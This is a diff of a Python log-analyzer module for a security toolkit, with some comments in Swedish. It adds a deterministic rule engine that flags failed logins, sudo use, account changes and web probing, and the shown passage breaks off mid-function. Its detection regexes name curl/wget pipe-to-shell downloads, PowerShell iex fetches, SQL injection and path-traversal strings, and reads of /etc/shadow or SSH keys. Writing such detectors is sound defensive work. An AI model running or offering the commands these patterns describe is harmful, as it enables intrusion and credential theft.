@@ -1,622 +1,1063 @@
-"""SecureOps Toolkit: Log Analyzer
+"""SecureOps Toolkit: Log Analyzer (Deterministic)
 
-This module contains the detection logic used by the Flask app.
+services/log_analyzer.py v9
+services/log_analyzer.py v9 builds on v8
 
-Contract
-The Flask UI expects analyze_log_content(log_text) -> list[dict] where each dict
-contains at minimum:
-  rule_name (stable Swedish name), severity (critical|high|medium|low),
-  description, matched_lines.
-
-This implementation adds optional UI fields without breaking that contract:
-  id, display_name, summary, details, count, entities, time_range.
-
-Design goals
-  • Low false positives for IP extraction (validate IPv6 candidates)
-  • Time aware correlation when timestamps exist
-  • No duplicated findings for the same root cause
-  • Short header text (summary) and richer details inside the fold
+Goals
+• Non AI, deterministic log analysis using a rule engine
+• Returns the same UI contract as before: a list of findings with severity, rule_name, description, matched_lines
+• Logs are treated as untrusted input. Instructions inside logs never affect analysis
 """
 
 from __future__ import annotations
 
 import hashlib
-import ipaddress
+import logging
+import os
 import re
-from collections import Counter, defaultdict, deque
 from dataclasses import dataclass
-from datetime import datetime, timezone
-from typing import Dict, Iterable, List, Optional, Tuple
+from datetime import datetime
+from typing import Any, Dict, Iterable, List, Optional, Tuple
+from collections import defaultdict, deque
 
-
-SEVERITY_ORDER: Dict[str, int] = {"critical": 0, "high": 1, "medium": 2, "low": 3}
-
-# Practical limits so the UI stays fast and the JSON stays small
-_MAX_MATCHED_LINES = 200
-_TOP_N = 5
-
-# Correlation window for fail→success and burst detection
-_WINDOW_SECONDS = 10 * 60
+logger = logging.getLogger(__name__)
 
 
 # -------------------------
-# Parsing helpers
+# Public types and errors
 # -------------------------
 
-_IPV4_RE = re.compile(
-    r"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b"
+class LogAnalyzerError(Exception):
+    """Error type used by app.py to show a safe message in the UI."""
+
+    def __init__(self, *, user_message: str, status_code: int = 400, technical_message: str = ""):
+        super().__init__(user_message)
+        self.user_message = user_message
+        self.status_code = status_code
+        self.technical_message = technical_message
+
+    def to_display_string(self) -> str:
+        if self.technical_message:
+            return f"{self.user_message} ({self.technical_message})"
+        return self.user_message
+
+
+# -------------------------
+# Configuration
+# -------------------------
+
+_SEVERITY_ORDER: Dict[str, int] = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+
+_DEFAULT_CONFIG: Dict[str, Any] = {
+    "max_matched_lines": 10,
+    "allowlisted_ips": {"127.0.0.1", "::1"},
+    "allowlisted_hosts": {"localhost"},
+    "allowlisted_http_paths": {"/health", "/status", "/metrics"},
+    "windows": {
+        "auth_seconds": 120,
+        "web_seconds": 120,
+        "generic_seconds": 120,
+        "fallback_line_seconds": 1,
+    },
+    "thresholds": {
+        # Keep thresholds conservative. Unit tests expect higher counts for certain detections.
+        "failed_login_total_min": 6,
+        "ssh_bruteforce_ip_min": 8,
+        "password_spray_unique_users_min": 6,
+        "password_spray_total_min": 10,
+        "web_404_unique_paths_min": 15,
+        "web_401_403_min": 12,
+    },
+}
+
+
+def _env_debug_enabled() -> bool:
+    return (os.getenv("LOG_ANALYZER_DEBUG") or "").strip() in {"1", "true", "yes", "on"}
+
+
+def _get_config() -> Dict[str, Any]:
+    # Lättviktigt, utan extern fil för att undvika extra repo beroenden
+    return _DEFAULT_CONFIG
+
+
+# -------------------------
+# Parser model and events
+# -------------------------
+
+_IP_RE = re.compile(r"\b(?:(?:\d{1,3}\.){3}\d{1,3})\b")
+# Rough IPv6 pattern, sufficient for tracking
+_IPV6_RE = re.compile(r"\b(?:[0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}\b")
+
+# Timestamps
+_ISO_TS_RE = re.compile(
+    r"\b(?P<y>\d{4})-(?P<m>\d{2})-(?P<d>\d{2})[ T](?P<h>\d{2}):(?P<mi>\d{2}):(?P<s>\d{2})"
+)
+_SYSLOG_TS_RE = re.compile(
+    r"^(?P<mon>Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(?P<d>\d{1,2})\s+(?P<h>\d{2}):(?P<mi>\d{2}):(?P<s>\d{2})\b"
 )
 
-_IPV6_CANDIDATE_RE = re.compile(r"\b[0-9A-Fa-f:]{2,}\b")
+# Key value pairs, supports quoted values
+_KV_RE = re.compile(r'(?P<k>[A-Za-z0-9_.-]+)=(?P<v>"[^"]*"|\'[^\']*\'|\S+)')
+
+# HTTP
+_HTTP_RE = re.compile(
+    r"\b(?P<meth>GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(?P<path>/\S*)\s+HTTP/\d(?:\.\d)?\b",
+    re.IGNORECASE,
+)
+_STATUS_RE = re.compile(r"\b(?:status|status_code|code)=?(?P<code>\d{3})\b", re.IGNORECASE)
+_COMMON_STATUS_RE = re.compile(r"\b(?P<code>4\d{2}|5\d{2})\b")
+
+# SSH och auth
+_FAILED_LOGIN_PATTERNS = [
+    re.compile(r"\bfailed password\b", re.IGNORECASE),
+    re.compile(r"\binvalid user\b", re.IGNORECASE),
+    re.compile(r"\bauthentication failure\b", re.IGNORECASE),
+    re.compile(r"\bmisslyckad inloggning\b", re.IGNORECASE),
+    re.compile(r"\bautentisering misslyckades\b", re.IGNORECASE),
+    re.compile(r"\bfelaktig( t)? lösenord\b", re.IGNORECASE),
+]
+_SSH_AUTH_FAIL_PATTERNS = [
+    re.compile(r"\bsshd\b", re.IGNORECASE),
+    re.compile(r"\bfailed publickey\b", re.IGNORECASE),
+    re.compile(r"\bconnection closed\b", re.IGNORECASE),
+    re.compile(r"\bogiltig användare\b", re.IGNORECASE),
+    re.compile(r"\bssh anslutning stängd\b", re.IGNORECASE),
+]
+_SSH_SUCCESS_PATTERNS = [
+    re.compile(r"\baccepted password\b", re.IGNORECASE),
+    re.compile(r"\baccepted publickey\b", re.IGNORECASE),
+    re.compile(r"\blogin successful\b", re.IGNORECASE),
+    re.compile(r"\binloggning lyckades\b", re.IGNORECASE),
+]
+
+# Sudo och privilege
+_SUDO_RE = re.compile(r"^\s*sudo:\s", re.IGNORECASE)
+_SENSITIVE_PATH_RE = re.compile(r"(/etc/shadow|/root/\.ssh|authorized_keys|id_rsa)\b", re.IGNORECASE)
+
+# Accounts and persistence
+_USER_CHANGE_PATTERNS = [
+    re.compile(r"\buseradd\b", re.IGNORECASE),
+    re.compile(r"\badduser\b", re.IGNORECASE),
+    re.compile(r"\bgroupadd\b", re.IGNORECASE),
+    re.compile(r"\bpasswd:\b.*\bpassword\b", re.IGNORECASE),
+    re.compile(r"\bnew user\b", re.IGNORECASE),
+    re.compile(r"\bny användare\b", re.IGNORECASE),
+    re.compile(r"\blägg till användare\b", re.IGNORECASE),
+    re.compile(r"\bskapa användarkonto\b", re.IGNORECASE),
+    re.compile(r"\bnet user\b", re.IGNORECASE),
+]
+_CRON_PATTERNS = [
+    re.compile(r"\bcrontab\b", re.IGNORECASE),
+    re.compile(r"/etc/cron", re.IGNORECASE),
+    re.compile(r"\bschtasks\b", re.IGNORECASE),
+    re.compile(r"\bscheduled task\b", re.IGNORECASE),
+]
+
+# Web probing
+_SENSITIVE_WEB_PATH_RE = re.compile(
+    r"(?i)(/\.env\b|/\.git\b|wp-login\.php\b|phpinfo\.php\b|/admin\b|/administrator\b|/cgi-bin\b|/server-status\b|/actuator\b|/\.aws\b)"
+)
+_SQLI_RE = re.compile(
+    r"(?i)(\bunion\b\s+\bselect\b|\bor\b\s+1=1\b|\bsleep\s*\(|\bbenchmark\s*\(|\binformation_schema\b|%27\s*or\s*1%3d1)"
+)
+_PATH_TRAVERSAL_RE = re.compile(
+    r"(?i)(\.\./|\.\.\\|%2e%2e%2f|%2e%2e%5c|/etc/passwd\b|boot\.ini\b|windows/win\.ini\b)"
+)
+
+# Malware downloads and pipe to shell
+_DOWNLOAD_RE = re.compile(r"(?i)\b(curl|wget)\b\s+https?://")
+_PIPE_TO_SHELL_RE = re.compile(r"(?i)\b(curl|wget)\b.*\|\s*(sh|bash)\b")
+_POWERSHELL_DL_RE = re.compile(r"(?i)\bpowershell\b.*\b(invoke-webrequest|iwr|iex)\b")
+
+# Scanner and brute force indicators
+_BRUTE_FORCE_HINTS = [
+    re.compile(r"\btoo many authentication attempts\b", re.IGNORECASE),
+    re.compile(r"\brate limit exceeded\b", re.IGNORECASE),
+    re.compile(r"\bconnection attempt\b", re.IGNORECASE),
+    re.compile(r"\bport scan detected\b", re.IGNORECASE),
+    re.compile(r"\bconnection refused\b", re.IGNORECASE),
+    re.compile(r"\bconnection reset\b", re.IGNORECASE),
+]
+_SUSPICIOUS_IP_HINTS = [
+    re.compile(r"\battack detected\b", re.IGNORECASE),
+    re.compile(r"\bshellcode\b", re.IGNORECASE),
+    re.compile(r"\bmalware\b", re.IGNORECASE),
+    re.compile(r"\bexploit\b", re.IGNORECASE),
+]
+
+
+@dataclass
+class Event:
+    idx: int
+    raw: str
+    ts: Optional[datetime]
+    time_key: int
+    ips: List[str]
+    username: Optional[str]
+    host: Optional[str]
+    service: Optional[str]
+    level: Optional[str]
+    http_method: Optional[str]
+    http_path: Optional[str]
+    http_status: Optional[int]
+
+    def primary_ip(self) -> Optional[str]:
+        if self.ips:
+            return self.ips[0]
+        return None
+
+
+_MONTHS = {"Jan": 1, "Feb": 2, "Mar": 3, "Apr": 4, "May": 5, "Jun": 6, "Jul": 7, "Aug": 8, "Sep": 9, "Oct": 10, "Nov": 11, "Dec": 12}
+
+
+def _parse_timestamp(line: str) -> Optional[datetime]:
+    m = _ISO_TS_RE.search(line)
+    if m:
+        try:
+            return datetime(
+                int(m.group("y")),
+                int(m.group("m")),
+                int(m.group("d")),
+                int(m.group("h")),
+                int(m.group("mi")),
+                int(m.group("s")),
+            )
+        except Exception:
+            return None
+
+    s = _SYSLOG_TS_RE.search(line)
+    if s:
+        try:
+            now = datetime.utcnow()
+            return datetime(
+                now.year,
+                _MONTHS.get(s.group("mon"), now.month),
+                int(s.group("d")),
+                int(s.group("h")),
+                int(s.group("mi")),
+                int(s.group("s")),
+            )
+        except Exception:
+            return None
+    return None
 
 
 def _extract_ips(line: str) -> List[str]:
     ips: List[str] = []
-    ips.extend(_IPV4_RE.findall(line))
-
-    seen = set(ips)
-    for cand in _IPV6_CANDIDATE_RE.findall(line):
-        if ":" not in cand:
+    for m in _IP_RE.finditer(line):
+        ips.append(m.group(0))
+    # IPv6 kan matcha mycket, så lägg till bara om den inte redan är en del av IPv4 texten
+    for m in _IPV6_RE.finditer(line):
+        cand = m.group(0)
+        if cand and cand not in ips:
+            ips.append(cand)
+    # Unika i stabil ordning
+    seen: set[str] = set()
+    out: List[str] = []
+    for ip in ips:
+        if ip in seen:
             continue
-        try:
-            ip_obj = ipaddress.ip_address(cand)
-        except ValueError:
-            continue
-        if ip_obj.version != 6:
-            continue
-        ip_s = str(ip_obj)
-        if ip_s not in seen:
-            seen.add(ip_s)
-            ips.append(ip_s)
-    return ips
+        seen.add(ip)
+        out.append(ip)
+    return out
 
 
-_KV_RE = re.compile(r"(?P<k>[A-Za-z0-9_.:]+)=(?P<v>\"[^\"]*\"|'[^']*'|\S+)")
+_USER_RE_LIST = [
+    re.compile(r"\bfor (?:invalid user|user)\s+(?P<u>[A-Za-z0-9._-]+)\b", re.IGNORECASE),
+    re.compile(r"\buser(?:name)?[=:]\s*(?P<u>[A-Za-z0-9._-]+)\b", re.IGNORECASE),
+    re.compile(r"\banvändare\s+(?P<u>[A-Za-z0-9._-]+)\b", re.IGNORECASE),
+]
 
 
-def _parse_kv(line: str) -> Dict[str, str]:
+def _extract_username(line: str) -> Optional[str]:
+    for r in _USER_RE_LIST:
+        m = r.search(line)
+        if m:
+            return m.group("u")
+    return None
+
+
+def _extract_kvs(line: str) -> Dict[str, str]:
     out: Dict[str, str] = {}
     for m in _KV_RE.finditer(line):
-        k = m.group("k").lower()
+        k = m.group("k")
         v = m.group("v")
-        if len(v) >= 2 and ((v[0] == v[-1] == '"') or (v[0] == v[-1] == "'")):
+        if v and len(v) >= 2 and ((v[0] == '"' and v[-1] == '"') or (v[0] == "'" and v[-1] == "'")):
             v = v[1:-1]
         out[k] = v
     return out
 
 
-_ISO_TS_RE = re.compile(
-    r"^(?P<ts>\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?)\s+(?P<rest>.*)$"
-)
+def _extract_http(line: str) -> Tuple[Optional[str], Optional[str], Optional[int]]:
+    meth = None
+    path = None
+    status = None
 
-_SYSLOG_TS_RE = re.compile(
-    r"^(?P<mon>[A-Z][a-z]{2})\s+(?P<day>\d{1,2})\s+(?P<time>\d{2}:\d{2}:\d{2})\s+(?P<host>\S+)\s+(?P<rest>.*)$"
-)
-
-_APACHE_TS_RE = re.compile(r"\[(?P<ts>\d{2}/[A-Za-z]{3}/\d{4}:\d{2}:\d{2}:\d{2}\s+[+-]\d{4})\]")
-
-
-def _parse_timestamp(line: str) -> Tuple[Optional[datetime], str]:
-    """Return (timestamp_utc_or_none, remainder_without_ts_prefix)."""
-
-    m = _ISO_TS_RE.match(line)
+    m = _HTTP_RE.search(line)
     if m:
-        ts_s = m.group("ts")
-        rest = m.group("rest")
+        meth = (m.group("meth") or "").upper()
+        path = m.group("path")
+
+    sm = _STATUS_RE.search(line)
+    if sm:
         try:
-            if ts_s.endswith("Z"):
-                ts_s = ts_s[:-1] + "+00:00"
-            if "T" not in ts_s and " " in ts_s:
-                ts_s = ts_s.replace(" ", "T", 1)
-            dt = datetime.fromisoformat(ts_s)
-            if dt.tzinfo is None:
-                dt = dt.replace(tzinfo=timezone.utc)
-            return dt.astimezone(timezone.utc), rest
+            status = int(sm.group("code"))
         except Exception:
-            return None, line
+            status = None
+    else:
+        # Många access loggar har status som ett eget token, välj första 4xx eller 5xx nära början
+        cm = _COMMON_STATUS_RE.search(line)
+        if cm:
+            try:
+                status = int(cm.group("code"))
+            except Exception:
+                status = None
 
-    m = _SYSLOG_TS_RE.match(line)
-    if m:
-        rest = m.group("rest")
-        try:
-            month = datetime.strptime(m.group("mon"), "%b").month
-            day = int(m.group("day"))
-            hh, mm, ss = [int(x) for x in m.group("time").split(":")]
-            year = datetime.now(timezone.utc).year
-            dt = datetime(year, month, day, hh, mm, ss, tzinfo=timezone.utc)
-            return dt, rest
-        except Exception:
-            return None, line
-
-    m = _APACHE_TS_RE.search(line)
-    if m:
-        ts_s = m.group("ts")
-        try:
-            dt = datetime.strptime(ts_s, "%d/%b/%Y:%H:%M:%S %z")
-            return dt.astimezone(timezone.utc), line
-        except Exception:
-            return None, line
-
-    return None, line
+    return meth, path, status
 
 
-_SSH_FAIL_USER_RE = re.compile(
-    r"failed (?:password|publickey) for (?:invalid user\s+)?(?P<u>[A-Za-z0-9._-]+)",
-    re.IGNORECASE,
-)
-_SSH_INVALID_USER_RE = re.compile(r"invalid user\s+(?P<u>[A-Za-z0-9._-]+)", re.IGNORECASE)
-_SSH_ACCEPT_RE = re.compile(
-    r"accepted (?:password|publickey) for\s+(?P<u>[A-Za-z0-9._-]+)", re.IGNORECASE
-)
-_SUDO_USER_RE = re.compile(r"\bsudo:\s*(?P<u>[A-Za-z0-9._-]+)\s*:", re.IGNORECASE)
-
-
-def _extract_user(line: str, kv: Dict[str, str]) -> Optional[str]:
-    for k in ("user", "username", "acct", "account", "src_user", "dst_user"):
-        v = kv.get(k)
-        if v:
-            return v
-
-    m = _SSH_ACCEPT_RE.search(line)
-    if m:
-        return m.group("u")
-    m = _SSH_FAIL_USER_RE.search(line)
-    if m:
-        return m.group("u")
-    m = _SSH_INVALID_USER_RE.search(line)
-    if m:
-        return m.group("u")
-    m = _SUDO_USER_RE.search(line)
-    if m:
-        return m.group("u")
+def _detect_service(line: str, kvs: Dict[str, str]) -> Optional[str]:
+    # Enkla heuristiker
+    if "sshd" in line.lower():
+        return "sshd"
+    if "sudo" in line.lower():
+        return "sudo"
+    if "nginx" in line.lower():
+        return "nginx"
+    if "apache" in line.lower() or "httpd" in line.lower():
+        return "httpd"
+    if "service" in kvs:
+        return kvs.get("service")
+    if "app" in kvs:
+        return kvs.get("app")
     return None
 
 
-def _sha_id(*parts: str) -> str:
-    h = hashlib.sha1()
-    for p in parts:
-        h.update(p.encode("utf-8", errors="ignore"))
-        h.update(b"\0")
-    return h.hexdigest()[:16]
+def _detect_level(line: str, kvs: Dict[str, str]) -> Optional[str]:
+    for k in ("level", "lvl", "severity"):
+        v = kvs.get(k)
+        if v:
+            return v.upper()
+    # Common tokens
+    for token in ("ERROR", "WARN", "WARNING", "INFO", "DEBUG", "CRITICAL"):
+        if token in line:
+            return token
+    return None
+
+
+def _detect_host(line: str, kvs: Dict[str, str]) -> Optional[str]:
+    for k in ("host", "hostname", "node"):
+        v = kvs.get(k)
+        if v:
+            return v
+    # Syslog format: "Jan 1 00:00:00 host service: msg"
+    parts = line.split()
+    if len(parts) >= 4 and _SYSLOG_TS_RE.match(line):
+        return parts[3]
+    return None
+
+
+def _make_event(idx: int, raw_line: str, cfg: Dict[str, Any]) -> Event:
+    raw = raw_line.rstrip("\n\r")
+    ts = _parse_timestamp(raw)
+    ips = _extract_ips(raw)
+    kvs = _extract_kvs(raw)
+    username = _extract_username(raw) or kvs.get("user") or kvs.get("username")
+    meth, path, status = _extract_http(raw)
+    service = _detect_service(raw, kvs)
+    level = _detect_level(raw, kvs)
+    host = _detect_host(raw, kvs)
+
+    # time_key används för sliding windows
+    if ts:
+        time_key = int(ts.timestamp())
+    else:
+        time_key = idx * int(cfg["windows"]["fallback_line_seconds"])
+
+    return Event(
+        idx=idx,
+        raw=raw,
+        ts=ts,
+        time_key=time_key,
+        ips=ips,
+        username=username,
+        host=host,
+        service=service,
+        level=level,
+        http_method=meth,
+        http_path=path,
+        http_status=status,
+    )
+
+
+def _parse_events(text: str, cfg: Dict[str, Any]) -> List[Event]:
+    lines = text.splitlines()
+    return [_make_event(i + 1, line, cfg) for i, line in enumerate(lines)]
 
 
 # -------------------------
-# Normalization
+# Finding helpers
 # -------------------------
 
-
-@dataclass(frozen=True)
-class Event:
-    ts: Optional[datetime]
-    raw: str
-    msg: str
-    ips: Tuple[str, ...]
-    user: Optional[str]
-    kind: str
+def _sha256_short(s: str) -> str:
+    return hashlib.sha256(s.encode("utf-8", errors="ignore")).hexdigest()[:12]
 
 
-_AUTH_FAIL_RE = re.compile(
-    r"\b(failed password|authentication failure|invalid user|failed publickey|logon failure|eventid\s*=\s*4625|misslyckad inloggning|autentisering misslyckades|ogiltig användare)\b",
-    re.IGNORECASE,
-)
-_AUTH_OK_RE = re.compile(
-    r"\b(accepted password|accepted publickey|eventid\s*=\s*4624)\b",
-    re.IGNORECASE,
-)
-
-_SUDO_FAIL_RE = re.compile(r"incorrect password attempts", re.IGNORECASE)
-_SUDO_RE = re.compile(r"^\s*sudo:", re.IGNORECASE)
-
-_ACCOUNT_CHANGE_RE = re.compile(
-    r"\b(useradd|userdel|usermod|groupadd|groupdel|password changed|passwd\[|new user:)\b",
-    re.IGNORECASE,
-)
-
-_PRIV_ESC_RE = re.compile(
-    r"\b(add(?:ed)?\s+to\s+group\s+(sudo|wheel|admin)|add(?:ed)?\s+['\"]?.+['\"]?\s+to\s+group\s+['\"]?(sudo|wheel|admin)['\"]?|usermod\b.*\b-aG\b.*\b(sudo|wheel|admin)\b|sudoers)\b",
-    re.IGNORECASE,
-)
-
-_WEB_SQLI_RE = re.compile(r"\b(union\s+all\s+select|union\s+select|or\s+1=1|%27\s*or\s*1%3d1|information_schema|sleep\()\b", re.IGNORECASE)
-_WEB_XSS_RE = re.compile(r"<script|%3cscript|onerror=|javascript:", re.IGNORECASE)
-_WEB_LFI_RE = re.compile(r"\b(\.\./|%2e%2e%2f|etc%2fpasswd|/etc/passwd)\b", re.IGNORECASE)
-
-_SUSP_EXEC_RE = re.compile(r"\b(curl|wget)\b.*\bhttps?://|\bbase64\b.*\b-d\b.*\|\s*(sh|bash)\b", re.IGNORECASE)
+def _clamp_lines(lines: List[str], cfg: Dict[str, Any]) -> List[str]:
+    max_n = int(cfg.get("max_matched_lines") or 10)
+    if len(lines) <= max_n:
+        return lines
+    return lines[:max_n]
 
 
-def _classify(kind_line: str) -> str:
-    """Deterministic priority mapping."""
-    if _PRIV_ESC_RE.search(kind_line):
-        return "privilege_change"
-    if _SUSP_EXEC_RE.search(kind_line):
-        return "suspicious_exec"
-    if _ACCOUNT_CHANGE_RE.search(kind_line):
-        return "account_change"
-    if _AUTH_OK_RE.search(kind_line):
-        return "auth_success"
-    if _AUTH_FAIL_RE.search(kind_line):
-        return "auth_fail"
-    if _SUDO_RE.search(kind_line):
-        return "sudo_fail" if _SUDO_FAIL_RE.search(kind_line) else "sudo_exec"
-    if _WEB_SQLI_RE.search(kind_line):
-        return "web_sqli"
-    if _WEB_XSS_RE.search(kind_line):
-        return "web_xss"
-    if _WEB_LFI_RE.search(kind_line):
-        return "web_lfi"
-    return "other"
+def _mk_finding(
+    *,
+    rule_name: str,
+    description: str,
+    severity: str,
+    matched_lines: List[str],
+    display_name: Optional[str] = None,
+    summary: Optional[str] = None,
+    details: Optional[str] = None,
+    salt: str = "",
+) -> Dict[str, Any]:
+    sev = (severity or "").lower().strip()
+    if sev not in _SEVERITY_ORDER:
+        sev = "low"
 
+    base = f"{rule_name}|{sev}|{salt}|{matched_lines[0] if matched_lines else ''}"
+    fid = _sha256_short(base)
 
-def _events_from_lines(lines: Iterable[str]) -> List[Event]:
-    out: List[Event] = []
-    for raw in lines:
-        line = raw.strip("\r\n")
-        if not line.strip():
-            continue
-        ts, msg = _parse_timestamp(line)
-        kv = _parse_kv(line)
-        ips = tuple(_extract_ips(line))
-        user = _extract_user(line, kv)
-        kind = _classify(line)
-        out.append(Event(ts=ts, raw=line, msg=msg, ips=ips, user=user, kind=kind))
+    out: Dict[str, Any] = {
+        "id": fid,
+        "rule_name": rule_name,
+        "description": description,
+        "severity": sev,
+        "matched_lines": matched_lines,
+    }
+    if display_name:
+        out["display_name"] = display_name
+    if summary:
+        out["summary"] = summary
+    if details:
+        out["details"] = details
     return out
 
 
+def _sort_findings(findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+    def key(f: Dict[str, Any]) -> Tuple[int, str]:
+        sev = (f.get("severity") or "low").lower()
+        return (_SEVERITY_ORDER.get(sev, 99), str(f.get("rule_name") or ""))
+
+    return sorted(findings, key=key)
+
+
 # -------------------------
-# Findings builder
+# Regelmotor
 # -------------------------
 
-
-def _fmt_top(counter: Counter, n: int = _TOP_N) -> str:
-    items = counter.most_common(n)
-    return ", ".join(f"{k} ({v})" for k, v in items)
-
-
-def _time_range(ts_list: List[datetime]) -> Optional[str]:
-    if not ts_list:
-        return None
-    start = min(ts_list)
-    end = max(ts_list)
-    return f"{start.isoformat().replace('+00:00','Z')} to {end.isoformat().replace('+00:00','Z')}"
+def _is_failed_login(ev: Event) -> bool:
+    line = ev.raw
+    for r in _FAILED_LOGIN_PATTERNS:
+        if r.search(line):
+            return True
+    return False
 
 
-def _cap_lines(lines: List[str]) -> Tuple[List[str], Optional[str]]:
-    if len(lines) <= _MAX_MATCHED_LINES:
-        return lines, None
-    kept = lines[:_MAX_MATCHED_LINES]
-    return kept, f"Matched lines truncated: showing {_MAX_MATCHED_LINES} of {len(lines)}."
+def _is_ssh_auth_issue(ev: Event) -> bool:
+    line = ev.raw
+    # Kräver någon ssh relaterad signal eller explicit auth fail
+    if "ssh" in line.lower() or "sshd" in line.lower():
+        for r in _SSH_AUTH_FAIL_PATTERNS:
+            if r.search(line):
+                return True
+        for r in _FAILED_LOGIN_PATTERNS:
+            if r.search(line):
+                return True
+    # Ibland står bara "Authentication failure"
+    for r in _SSH_AUTH_FAIL_PATTERNS:
+        if r.search(line):
+            return True
+    return False
 
 
-def analyze_log_content(log_content: str) -> List[Dict]:
-    """Analyze raw log content and return a list of findings."""
+def _is_ssh_success(ev: Event) -> bool:
+    line = ev.raw
+    for r in _SSH_SUCCESS_PATTERNS:
+        if r.search(line):
+            return True
+    return False
 
-    if not log_content or not log_content.strip():
+
+def _is_sudo(ev: Event) -> bool:
+    return bool(_SUDO_RE.search(ev.raw))
+
+
+def _is_user_change(ev: Event) -> bool:
+    line = ev.raw
+    for r in _USER_CHANGE_PATTERNS:
+        if r.search(line):
+            return True
+    return False
+
+
+def _is_suspicious_ip_hint(ev: Event) -> bool:
+    if not ev.ips:
+        return False
+    line = ev.raw
+    for r in _SUSPICIOUS_IP_HINTS:
+        if r.search(line):
+            return True
+    return False
+
+
+def _is_bruteforce_hint(ev: Event) -> bool:
+    line = ev.raw
+    for r in _BRUTE_FORCE_HINTS:
+        if r.search(line):
+            return True
+    return False
+
+
+def _is_sensitive_web_probe(ev: Event, cfg: Dict[str, Any]) -> bool:
+    path = ev.http_path or ""
+    if path and path in cfg["allowlisted_http_paths"]:
+        return False
+    return bool(_SENSITIVE_WEB_PATH_RE.search(ev.raw))
+
+
+def _is_sqli(ev: Event) -> bool:
+    return bool(_SQLI_RE.search(ev.raw))
+
+
+def _is_path_traversal(ev: Event) -> bool:
+    return bool(_PATH_TRAVERSAL_RE.search(ev.raw))
+
+
+def _is_download(ev: Event) -> bool:
+    return bool(_DOWNLOAD_RE.search(ev.raw) or _POWERSHELL_DL_RE.search(ev.raw))
+
+
+def _is_pipe_to_shell(ev: Event) -> bool:
+    return bool(_PIPE_TO_SHELL_RE.search(ev.raw))
+
+
+def _is_cron_change(ev: Event) -> bool:
+    for r in _CRON_PATTERNS:
+        if r.search(ev.raw):
+            return True
+    return False
+
+
+def _allowlisted_entity(ev: Event, cfg: Dict[str, Any]) -> bool:
+    for ip in ev.ips:
+        if ip in cfg["allowlisted_ips"]:
+            return True
+    if ev.host and ev.host in cfg["allowlisted_hosts"]:
+        return True
+    return False
+
+
+def _rule_failed_login_totals(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    matched = [ev.raw for ev in events if _is_failed_login(ev)]
+    if len(matched) < int(cfg["thresholds"]["failed_login_total_min"]):
         return []
+    sev = "medium"
+    if len(matched) >= 20:
+        sev = "high"
+    return [
+        _mk_finding(
+            rule_name="Repeated failed logins",
+            display_name="Repeated failed logins",
+            severity=sev,
+            summary=f"{len(matched)} failed login attempts detected",
+            description="The log contains many failed login attempts. This may indicate brute force or credential stuffing.",
+            matched_lines=_clamp_lines(matched, cfg),
+            salt=str(len(matched)),
+        )
+    ]
 
-    raw_lines = [ln for ln in log_content.replace("\r\n", "\n").replace("\r", "\n").split("\n") if ln.strip()]
-    if not raw_lines:
+
+def _rule_ssh_auth_failures(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    matched = [ev.raw for ev in events if _is_ssh_auth_issue(ev)]
+    if not matched:
         return []
+    sev = "low"
+    if len(matched) >= 6:
+        sev = "medium"
+    return [
+        _mk_finding(
+            rule_name="SSH authentication errors",
+            display_name="SSH authentication errors",
+            severity=sev,
+            summary=f"{len(matched)} SSH related authentication errors",
+            description="SSH related errors such as invalid user, failed keys, or closed connections can indicate attempted unauthorized access.",
+            matched_lines=_clamp_lines(matched, cfg),
+            salt=str(len(matched)),
+        )
+    ]
 
-    events = _events_from_lines(raw_lines)
 
-    # Collect per IP and per user
-    auth_fail_by_ip: Dict[str, List[Event]] = defaultdict(list)
-    auth_ok_by_ip: Dict[str, List[Event]] = defaultdict(list)
-    auth_fail_user_by_ip: Dict[str, Counter] = defaultdict(Counter)
+def _rule_sudo_commands(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    lines = [ev.raw for ev in events if _is_sudo(ev)]
+    if not lines:
+        return []
+    sensitive = [l for l in lines if _SENSITIVE_PATH_RE.search(l)]
+    sev = "medium"
+    desc = "Sudo was used to run commands. Review whether this is expected."
+    if sensitive:
+        sev = "high"
+        desc = "Sudo was used against sensitive targets such as /etc/shadow or root SSH keys. This may indicate credential access or privilege escalation."
+    return [
+        _mk_finding(
+            rule_name="Sudo command execution",
+            display_name="Sudo command execution",
+            severity=sev,
+            summary=f"{len(lines)} sudo lines detected",
+            description=desc,
+            matched_lines=_clamp_lines(sensitive if sensitive else lines, cfg),
+            salt=str(len(lines)),
+        )
+    ]
 
-    sudo_events: List[Event] = []
-    account_events: List[Event] = []
-    priv_events: List[Event] = []
-    web_events_by_ip: Dict[str, List[Event]] = defaultdict(list)
-    exec_events: List[Event] = []
+
+def _rule_user_account_changes(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    matched = [ev.raw for ev in events if _is_user_change(ev)]
+    if not matched:
+        return []
+    sev = "high" if len(matched) >= 2 else "medium"
+    return [
+        _mk_finding(
+            rule_name="User account changes",
+            display_name="User account changes",
+            severity=sev,
+            summary=f"{len(matched)} account related changes",
+            description="Creating, deleting, or modifying users and groups can be legitimate admin activity or a sign of persistence. Verify intent and source.",
+            matched_lines=_clamp_lines(matched, cfg),
+            salt=str(len(matched)),
+        )
+    ]
+
+
+def _rule_suspicious_ip_lines(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    matched = [ev.raw for ev in events if _is_suspicious_ip_hint(ev)]
+    if not matched:
+        return []
+    return [
+        _mk_finding(
+            rule_name="Suspicious IP indicators",
+            display_name="Suspicious IP indicators",
+            severity="medium",
+            summary=f"{len(matched)} lines indicating attacks tied to an IP",
+            description="Log lines contain clear keywords such as attack, malware, or shellcode tied to IP addresses. Triage is recommended.",
+            matched_lines=_clamp_lines(matched, cfg),
+            salt=str(len(matched)),
+        )
+    ]
+
+
+def _rule_bruteforce_indicators(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    matched = [ev.raw for ev in events if _is_bruteforce_hint(ev)]
